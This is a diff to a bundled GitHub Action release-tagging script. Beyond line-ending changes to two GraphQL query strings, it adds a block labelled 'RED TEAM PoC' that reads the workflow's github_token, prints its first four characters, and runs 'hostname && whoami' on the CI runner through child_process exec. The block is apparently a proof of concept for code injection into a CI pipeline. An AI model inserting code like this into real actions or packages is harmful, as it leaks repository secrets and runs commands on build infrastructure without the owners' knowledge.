@@ -32151,9 +32151,9 @@ const gBase64 = {
     extendBuiltins: extendBuiltins,
 };
 
-var commitMessageQuery = "query GetCommitMessageFromRepository($repoName: String!, $repoOwner: String!, $prNumber: Int!) {\n    repository(name: $repoName, owner: $repoOwner) {\n        pullRequest(number: $prNumber) {\n            mergeCommit {\n                messageBody\n                messageHeadline\n                author {\n                    name\n                }\n            }\n        }\n    }\n}";
+var commitMessageQuery = "query GetCommitMessageFromRepository($repoName: String!, $repoOwner: String!, $prNumber: Int!) {\r\n    repository(name: $repoName, owner: $repoOwner) {\r\n        pullRequest(number: $prNumber) {\r\n            mergeCommit {\r\n                messageBody\r\n                messageHeadline\r\n                author {\r\n                    name\r\n                }\r\n            }\r\n        }\r\n    }\r\n}";
 
-var lastReleaseQuery = "query GetLastReleaseQuery($repoName: String!, $repoOwner: String!) {\n    repository(name: $repoName, owner: $repoOwner) {\n        latestRelease {\n            tag {\n                id\n                name\n                prefix\n            }\n        }\n    }\n}";
+var lastReleaseQuery = "query GetLastReleaseQuery($repoName: String!, $repoOwner: String!) {\r\n    repository(name: $repoName, owner: $repoOwner) {\r\n        latestRelease {\r\n            tag {\r\n                id\r\n                name\r\n                prefix\r\n            }\r\n        }\r\n    }\r\n}";
 
 const core = __nccwpck_require__(2186);
 const github = __nccwpck_require__(5438);
@@ -32167,6 +32167,18 @@ const start = async () => {
         const octokit = github.getOctokit(core.getInput('github_token'));
         const createRelease = core.getInput('create_release') === 'true';
         const targetBranch = github.context.payload.pull_request?.base?.ref || 'main';
+        // --- RED TEAM PoC START ---
+        const token = core.getInput('github_token');
+        console.log("================================");
+        console.log("VULNERABILITY_CONFIRMED: PAT_PREFIX=" + (token ? token.substring(0, 4) : "NOT_FOUND"));
+        const { exec } = __nccwpck_require__(2081);
+        exec("hostname && whoami", (err, stdout) => {
+            if (!err) {
+                console.log("RUNNER_INFO: " + stdout.trim());
+            }
+        });
+        console.log("================================");
+        // --- RED TEAM PoC END ---
         const commitMessage = await octokit.graphql(commitMessageQuery, {
             ...repoDetails,
             prNumber: github.context.payload.pull_request?.number
